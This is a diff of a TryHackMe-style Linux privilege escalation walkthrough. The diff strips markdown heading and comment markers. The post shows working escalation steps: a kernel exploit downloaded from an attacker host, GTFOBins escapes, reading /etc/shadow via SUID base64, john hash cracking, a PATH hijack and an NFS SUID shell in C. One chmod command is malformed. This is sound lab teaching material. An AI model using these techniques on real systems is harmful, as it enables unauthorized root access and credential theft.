@@ -5,7 +5,7 @@ date: "2026-03-16"
 tags: ["tryhackme","walkthrough"]
 ---
 
-## Overview
+ Overview
 
 This room teaches **8 core Linux privilege escalation techniques** — the most important post-exploitation skill in pentesting. You start as a low-privilege user (`karen`) and learn how to reach root through different paths every time.
 
@@ -22,7 +22,7 @@ Techniques covered:
 
 ---
 
-## Task 1 & 2 — Introduction
+ Task 1 & 2 — Introduction
 
 Read through the intro. Understand that **privilege escalation** means going from a normal user → root. This is almost always needed after initial access in a real pentest.
 
@@ -30,16 +30,16 @@ Read through the intro. Understand that **privilege escalation** means going fro
 
 ---
 
-## Task 3 — Enumeration
+ Task 3 — Enumeration
 
 SSH into the machine first:
 
 ```bash
 ssh karen@<MACHINE_IP>
-# Password: Password1
+ Password: Password1
 ```
 
-### Key Enumeration Commands
+ Key Enumeration Commands
 
 **Hostname — what is the machine called?**
 
@@ -76,7 +76,7 @@ cat /etc/issue
 
 ---
 
-## Task 4 — Privileged Access (Concept)
+ Task 4 — Privileged Access (Concept)
 
 This task explains the difference between:
 
@@ -87,11 +87,11 @@ This task explains the difference between:
 
 ---
 
-## Task 5 — Kernel Exploit
+ Task 5 — Kernel Exploit
 
 The kernel version `3.13.0-24-generic` is vulnerable to **CVE-2015-1328** (overlayfs exploit).
 
-### Step 1: Find and Download the Exploit
+ Step 1: Find and Download the Exploit
 
 On your attacker machine:
 
@@ -111,7 +111,7 @@ searchsploit -m 37292
 
 Or download directly from ExploitDB.
 
-### Step 2: Transfer to Target
+ Step 2: Transfer to Target
 
 Start a Python web server on your attacker machine:
 
@@ -126,7 +126,7 @@ cd /tmp
 wget http://<ATTACKER_IP>:80/37292.c
 ```
 
-### Step 3: Compile and Run
+ Step 3: Compile and Run
 
 ```bash
 gcc 37292.c -o 37292
@@ -139,11 +139,11 @@ You should drop into a root shell:
 
 ```bash
 id
-# uid=0(root)
+ uid=0(root)
 ```
 
 ![Pasted image 20260412123018.png](/images/blog/Pasted_image_20260412123018.png)
-### Step 4: Get the Flag
+ Step 4: Get the Flag
 
 ```bash
 cat /home/matt/flag1.txt
@@ -151,7 +151,7 @@ cat /home/matt/flag1.txt
 
 ![Pasted image 20260412190212.png](/images/blog/Pasted_image_20260412190212.png)
 ![Pasted image 20260412190224.png](/images/blog/Pasted_image_20260412190224.png)
-### Task 5 Answer
+ Task 5 Answer
 
 |Question|Answer|
 |---|---|
@@ -159,9 +159,9 @@ cat /home/matt/flag1.txt
 
 ---
 
-## Task 6 — Sudo Privilege Escalation
+ Task 6 — Sudo Privilege Escalation
 
-### Step 1: Check Sudo Permissions
+ Step 1: Check Sudo Permissions
 
 ```bash
 sudo -l
@@ -171,7 +171,7 @@ sudo -l
 
 Output shows karen can run `find`, `less`, and `nano` with sudo — without a password.
 
-### Step 2: Exploit via GTFOBins
+ Step 2: Exploit via GTFOBins
 
 Head to [gtfobins.github.io](https://gtfobins.github.io) and search each binary under the **Sudo** filter.
 
@@ -212,9 +212,9 @@ Scroll through to find the hash for `frank`.
 
 ---
 
-## Task 7 — SUID Privilege Escalation
+ Task 7 — SUID Privilege Escalation
 
-### Step 1: Find All SUID Binaries
+ Step 1: Find All SUID Binaries
 
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
@@ -224,7 +224,7 @@ Compare this list against [GTFOBins](https://gtfobins.github.io) using the **SUI
 
 **`base64`** appears on both the system and GTFOBins SUID list — exploit it.
 
-### Step 2: Find a Comic Book Writer Username
+ Step 2: Find a Comic Book Writer Username
 
 ```bash
 cat /etc/passwd
@@ -234,7 +234,7 @@ cat /etc/passwd
 
 Look for the user `gerryconway` — that's the answer.
 
-### Step 3: Read `/etc/shadow` via base64 SUID
+ Step 3: Read `/etc/shadow` via base64 SUID
 
 ```bash
 /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
@@ -250,7 +250,7 @@ john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ![Pasted image 20260412191023.png](/images/blog/Pasted_image_20260412191023.png)
 
-### Step 4: Read flag3.txt
+ Step 4: Read flag3.txt
 
 ```bash
 /usr/bin/base64 /home/ubuntu/flag3.txt | /usr/bin/base64 -d
@@ -260,11 +260,11 @@ john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ---
 
-## Task 8 — Capabilities
+ Task 8 — Capabilities
 
 Capabilities let programs have specific root-like powers without being fully SUID.
 
-### Step 1: List All Capabilities
+ Step 1: List All Capabilities
 
 ```bash
 getcap -r / 2>/dev/null
@@ -272,15 +272,15 @@ getcap -r / 2>/dev/null
 
 ![Pasted image 20260412191132.png](/images/blog/Pasted_image_20260412191132.png)
 
-### Step 2: Count Binaries with Capabilities
+ Step 2: Count Binaries with Capabilities
 
 Count the results → **6 binaries**
 
-### Step 3: Find the Exploitable One
+ Step 3: Find the Exploitable One
 
 Check [GTFOBins](https://gtfobins.github.io/#+capabilities) — `vim` has a capabilities exploit entry.
 
-### Step 4: Exploit via vim Capability
+ Step 4: Exploit via vim Capability
 
 ```bash
 ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
@@ -298,11 +298,11 @@ cat /home/ubuntu/flag4.txt
 
 ---
 
-## Task 9 — Cron Job Privilege Escalation
+ Task 9 — Cron Job Privilege Escalation
 
 Cron jobs run commands on a schedule. If root runs a script you can write to — you own root.
 
-### Step 1: Read the Crontab
+ Step 1: Read the Crontab
 
 ```bash
 cat /etc/crontab
@@ -310,7 +310,7 @@ cat /etc/crontab
 
 ![Pasted image 20260412132946.png](/images/blog/Pasted_image_20260412132946.png)
 
-### Step 2: Check Permissions on backup.sh
+ Step 2: Check Permissions on backup.sh
 
 ```bash
 ls -la /home/karen/backup.sh
@@ -320,7 +320,7 @@ ls -la /home/karen/backup.sh
 
 Karen has **write access** to `backup.sh` — and root runs it.
 
-### Step 3: Inject a Reverse Shell
+ Step 3: Inject a Reverse Shell
 
 On your attacker machine, start a listener:
 
@@ -338,7 +338,7 @@ Overwrite `backup.sh` with a reverse shell:
 
 Wait up to 1 minute for cron to fire. You'll get a root shell in your netcat listener.
 
-### Step 4: Read the Flag
+ Step 4: Read the Flag
 
 ```bash
 cat /home/ubuntu/flag5.txt
@@ -347,7 +347,7 @@ cat /home/ubuntu/flag5.txt
 ![Pasted image 20260412135309.png](/images/blog/Pasted_image_20260412135309.png)
 
 ![Pasted image 20260412214105.png](/images/blog/Pasted_image_20260412214105.png)
-### Step 5: Get Matt's Password Hash (Q3)
+ Step 5: Get Matt's Password Hash (Q3)
 
 ```bash
 cat /etc/shadow
@@ -365,9 +365,9 @@ john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt matt_hash.txt
 
 ---
 
-## Task 10 — Privilege Escalation: PATH
+ Task 10 — Privilege Escalation: PATH
 
-### Step 1: Find Writable Folders
+ Step 1: Find Writable Folders
 
 ```bash
 find / -writable -type d 2>/dev/null
@@ -379,7 +379,7 @@ Scroll through the output — the only odd result that stands out is `/home/murd
 
 ---
 
-### Step 2: Add `/home/murdoch` to PATH
+ Step 2: Add `/home/murdoch` to PATH
 
 ```bash
 export PATH=/home/murdoch:$PATH
@@ -392,7 +392,7 @@ Now Linux will search `/home/murdoch` **first** when looking for any command.
 
 ---
 
-### Step 3: Create a Fake `thm` Binary
+ Step 3: Create a Fake `thm` Binary
 
 ```bash
 echo '/bin/bash' > /home/murdoch/thm
@@ -405,7 +405,7 @@ We've created a file called `thm` that spawns a bash shell. Since the SUID `test
 
 ---
 
-### Step 4: Run the SUID Binary
+ Step 4: Run the SUID Binary
 
 ```bash
 /home/murdoch/test
@@ -417,7 +417,7 @@ The binary looks for `thm` → finds our fake one in `/home/murdoch` → runs it
 
 ```bash
 id
-# uid=0(root)
+ uid=0(root)
 ```
 
 ![Pasted image 20260412221946.png](/images/blog/Pasted_image_20260412221946.png)
@@ -426,7 +426,7 @@ id
 
 ---
 
-### Step 7: Read flag6.txt
+ Step 7: Read flag6.txt
 
 ```bash
 cat /home/matt/flag6.txt
@@ -438,13 +438,13 @@ cat /home/matt/flag6.txt
 
 ---
 
-## Task 11 — NFS Privilege Escalation
+ Task 11 — NFS Privilege Escalation
 
-### What is `no_root_squash`?
+ What is `no_root_squash`?
 
 Normally, NFS maps root-created files to `nobody` for safety (root squashing). When `no_root_squash` is set, **files created by root on a mounted share keep their root ownership**. We abuse this to plant an SUID binary.
 
-### Step 1: Check NFS Exports on Target
+ Step 1: Check NFS Exports on Target
 
 ```bash
 cat /etc/exports
@@ -452,10 +452,10 @@ cat /etc/exports
 
 3 shares with `no_root_squash` → all exploitable.
 
-### Step 2: Mount the Share on Attacker Machine
+ Step 2: Mount the Share on Attacker Machine
 
 ```bash
-# On your attacker machine (as root)
+ On your attacker machine (as root)
 sudo su
 mkdir /tmp/tryhackme
 mount -o rw,vers=2 <MACHINE_IP>:/tmp /tmp/tryhackme
@@ -463,7 +463,7 @@ mount -o rw,vers=2 <MACHINE_IP>:/tmp /tmp/tryhackme
 
 ![Pasted image 20260412214540.png](/images/blog/Pasted_image_20260412214540.png)
 
-### Step 3: Create a SUID Shell Payload
+ Step 3: Create a SUID Shell Payload
 
 Still as root on your attacker machine:
 
@@ -473,17 +473,17 @@ Still as root on your attacker machine:
 #include <stdlib.h>
 #include <unistd.h>
 int main() {
-    setuid(0);
-    setgid(0);
-    system("/bin/bash");
-    return 0;
+ setuid(0);
+ setgid(0);
+ system("/bin/bash");
+ return 0;
 }
 ```
 
 ![Pasted image 20260412214603.png](/images/blog/Pasted_image_20260412214603.png)
 
 ```bash
-# Save, compile, and set SUID on the mounted share
+ Save, compile, and set SUID on the mounted share
 gcc -static exploit.c -o exploit -w
 chmod +sexploit
 ```
@@ -491,13 +491,13 @@ chmod +sexploit
 ![Pasted image 20260412214619.png](/images/blog/Pasted_image_20260412214619.png)
 ![Pasted image 20260412214630.png](/images/blog/Pasted_image_20260412214630.png)
 ![Pasted image 20260412214641.png](/images/blog/Pasted_image_20260412214641.png)
-### Step 4: Execute on Target
+ Step 4: Execute on Target
 
 Back on the target machine:
 
 ```bash
 /tmp/exploit
-# You're root
+ You're root
 cat /home/ubuntu/flag7.txt
 ```
 ![Pasted image 20260412214707.png](/images/blog/Pasted_image_20260412214707.png)
@@ -507,9 +507,9 @@ cat /home/ubuntu/flag7.txt
 ![Pasted image 20260412214728.png](/images/blog/Pasted_image_20260412214728.png)
 
 ---
-## Task 12 — Capstone Challenge Walkthrough
+ Task 12 — Capstone Challenge Walkthrough
 
-### Step 1: Check Sudo — Dead End
+ Step 1: Check Sudo — Dead End
 
 ```bash
 sudo -l
@@ -521,10 +521,10 @@ sudo -l
 
 ---
 
-### Step 2: Enumerate Home Directories
+ Step 2: Enumerate Home Directories
 
 ```bash
-ls -l /home/missy      
+ls -l /home/missy 
 ls -l /home/rootflag
 ls -l /home/leonard
 ```
@@ -539,7 +539,7 @@ Can't read either flag directly. Need to escalate first.
 
 ---
 
-### Step 3: Check Cron Jobs
+ Step 3: Check Cron Jobs
 
 ```bash
 cat /etc/crontab
@@ -551,7 +551,7 @@ No user-defined cron jobs. Dead end.
 
 ---
 
-### Step 4: Find SUID Binaries
+ Step 4: Find SUID Binaries
 
 ```bash
 find / -perm -u=s 2>/dev/null
@@ -563,7 +563,7 @@ Scanning the list — `/usr/bin/base64` stands out. It's SUID and on GTFOBins. T
 
 ---
 
-### Step 5: Read `/etc/shadow` via base64 SUID
+ Step 5: Read `/etc/shadow` via base64 SUID
 
 ```bash
 /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
@@ -573,7 +573,7 @@ This reads the shadow file as root. Copy **missy's hash** from the output.
 
 ---
 
-### Step 6: Crack Root and Missy's Hash
+ Step 6: Crack Root and Missy's Hash
 
 Save the hash on your **attacker machine**:
 
@@ -618,16 +618,16 @@ taking too long to crack.
 
 ---
 
-### Step 7: Switch to Missy
+ Step 7: Switch to Missy
 
 ```bash
 su missy
-# Password: Password1
+ Password: Password1
 ```
 
 ---
 
-### Step 8: Get Flag 1
+ Step 8: Get Flag 1
 
 ```bash
 cd /home/missy/Documents
@@ -642,13 +642,13 @@ cat flag1.txt
 
 ---
 
-### Step 9: Get Flag 2 (root flag)
+ Step 9: Get Flag 2 (root flag)
 
 As missy, check sudo:
 
 ```bash
 sudo -l
-# missy can run: /usr/bin/find
+ missy can run: /usr/bin/find
 ```
 
 ![Pasted image 20260412220911.png](/images/blog/Pasted_image_20260412220911.png)
@@ -668,7 +668,7 @@ cat /home/rootflag/flag2.txt
 
 ---
 
-## Key Takeaways
+ Key Takeaways
 
 **1. Always enumerate first.** Kernel version, OS, users, sudo rights, SUID files, cron jobs, NFS exports — gather everything before exploiting anything.
 
